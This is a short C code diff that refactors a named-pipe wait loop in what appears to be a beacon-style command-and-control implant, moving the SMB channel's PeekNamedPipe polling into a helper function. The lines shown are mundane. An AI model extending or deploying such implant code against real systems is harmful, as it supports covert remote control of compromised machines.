@@ -4,6 +4,7 @@
 
 #include "link.h"
 #include "beacon.h"
+#include "pipe.h"
 #include "settings.h"
 
 int ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
@@ -150,19 +151,7 @@ void ProtocolSmbFlush(PROTOCOL* protocol)
 
 BOOL ProtocolSmbWaitForData(PROTOCOL* protocol, DWORD waitTime, int iterWaitTime)
 {
-	DWORD timeout = GetTickCount() + waitTime;
-	DWORD available;
-
-	while (GetTickCount() < timeout)
-	{
-		if (!PeekNamedPipe(protocol->channel.handle, NULL, 0, NULL, &available, NULL))
-			return FALSE;
-
-		if (available)
-			return TRUE;
-
-		Sleep(iterWaitTime);
-	}
+	return PipeWaitForData(protocol->channel.handle, waitTime, iterWaitTime);
 }
 
 BOOL ProtocolTcpWaitForData(PROTOCOL* protocol, DWORD waitTime, int iterWaitTime)
